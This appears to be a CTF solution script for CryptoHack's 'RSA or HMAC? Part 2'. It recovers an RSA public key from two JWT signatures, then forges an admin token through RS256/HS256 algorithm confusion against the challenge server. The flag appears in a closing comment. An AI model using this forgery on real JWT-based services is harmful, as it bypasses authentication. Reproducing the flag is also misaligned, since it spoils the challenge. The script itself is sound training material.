# Cryptohack: RSA or HMAC? Part 2

import jwt
import gmpy2
import requests
import json
import random 

from pwn import success
from hashlib import sha256
from base64 import urlsafe_b64decode
from Crypto.Util.number import bytes_to_long, inverse
from Crypto.PublicKey import RSA
from factordb.factordb import FactorDB

def pkcs1_v1_5_encode(msg: bytes, n_len: int):
    SHA256_Digest_Info = b'\x30\x31\x30\x0D\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01\x05\x00\x04\x20'
    T = SHA256_Digest_Info + sha256(msg).digest()
    PS = b'\xFF' * (n_len - len(T) - 3)
    return b'\x00\x01' + PS + b'\x00' + T

def get_magic(jwt):
    header, payload, signature = jwt.split(".")

    raw_signature = urlsafe_b64decode(f"{signature}==")
    raw_signature_int = gmpy2.mpz(bytes_to_long(raw_signature))

    padded_msg = pkcs1_v1_5_encode(f"{header}.{payload}".encode(), len(raw_signature))
    padded_int = gmpy2.mpz(bytes_to_long(padded_msg))

    e = gmpy2.mpz(0x10001)

    return gmpy2.mpz(pow(raw_signature_int, e) - padded_int)

URL = 'http://web.cryptohack.org/rsa-or-hmac-2/'

def get_token(username):
    return json.loads(requests.get(f'{URL}create_session/{username}/').text)['session']

def verify_token(token):
    return requests.get(f'{URL}/authorise/{token}/').text

if __name__ == '__main__':
    jwt0 = get_token(random.random())
    jwt1 = get_token(random.random())

    success(f'jwt 0: {jwt0}')
    success(f'jwt 1: {jwt1}')

    magic0 = get_magic(jwt0)
    magic1 = get_magic(jwt1)

    g = gmpy2.gcd(magic0, magic1)
    success(f'gcd: {g}')

    factors = FactorDB(g)
    factors.connect()
    factors = factors.get_factor_list()
    success(f'factors: {factors}')

    N = factors[-1]
    e = 0x10001
    success(f'N: {N}')

    key = RSA.construct((N, e))

    PUBLIC_KEY = key.exportKey()

    PUBLIC_KEY = PUBLIC_KEY.decode().replace('PUBLIC', 'RSA PUBLIC').encode()
    PUBLIC_KEY += b'\n'

    # https://lapo.it/asn1js/  Remove unnecessary info in the header of PEM and we got this:
#     PUBLIC_KEY = b'''-----BEGIN RSA PUBLIC KEY-----
# MIIBCgKCAQEA7pgbuP6X8XHyFr47ybSr1yT+m++FNn/fUnnKP113bYbcp/Jn4nl5
# kiRoK4cgXWv6yYaTxVMSyvLcdDkPsmZ0J4DfBXZSpUKY2QK+oR76nb5fZ+VNUEi0
# Iu15GBJdIPj8yEA81OviDNcnXRyDpLBWtXZ1gNJyvoiOj/3DgRcIWz9yJNkze8ln
# utMOzxobg/o2i9oewa2MJk+MHKUZOOCxoaVfmdczTqDIXdowxnWCTEgWb4SBN+MH
# Gu+8pWgGqXCioGDPALHRR98CWopHC0z7Via/UXkLNGCjJfdNZiJFnLHG8tATDvDS
# CDQSg46MARk5Ein4ekVPaNKnjc6INnO01QIDAQAB
# -----END RSA PUBLIC KEY-----'''

    success('PUBLIC_KEY:')
    print(PUBLIC_KEY.decode())

    forged_jwt = jwt.encode({'username': 'admin', 'admin': True}, PUBLIC_KEY, algorithm='HS256')
    success(forged_jwt)

    status = verify_token(forged_jwt)
    success(f'Status: {status}')

    # crypto{thanks_silentsignal_for_inspiration}